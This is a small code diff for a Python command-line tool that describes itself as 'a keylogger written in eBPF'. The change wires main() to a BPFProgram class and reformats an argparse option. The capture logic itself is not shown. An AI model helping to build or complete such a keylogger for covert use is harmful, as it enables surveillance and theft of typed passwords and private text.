@@ -1,11 +1,16 @@
 import os, sys
 import argparse
 
+from bpf_program import BPFProgram
+
 DESCRIPTION = """
 A keylogger written in eBPF.
 """
 
+
 def main(args):
+    bpf = BPFProgram(args)
+    bpf.main()
     print(args)
 
 
@@ -21,8 +26,7 @@ def parse_args(args=sys.argv[1:]):
     )
 
     # Debugging info
-    parser.add_argument("--debug", action="store_true",
-            help="Print debugging info.")
+    parser.add_argument("--debug", action="store_true", help="Print debugging info.")
 
     # Timestamps
     parser.add_argument(
